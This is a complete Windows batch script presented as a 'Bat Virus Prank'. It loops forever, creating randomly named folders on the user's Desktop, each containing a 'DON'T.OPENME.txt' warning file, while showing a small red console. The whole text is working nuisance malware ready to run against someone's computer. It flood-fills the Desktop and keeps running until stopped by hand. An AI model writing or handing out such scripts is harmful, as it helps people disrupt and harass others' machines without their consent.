@echo off
color 04
title Bat Virus Prank
echo Prank Started! Creating chaos...
mode con: cols=20 lines=5

:: Infinite loop creating folders
:loop
set /a num=%random% %%99999
mkdir "%USERPROFILE%\Desktop\macro-12.0-%num%"
echo WARNING! DO NOT OPEN THIS FILE! > "%USERPROFILE%\Desktop\macro-12.0-%num%\DON'T.OPENME.txt"
timeout /t 0.2 >nul
goto loop
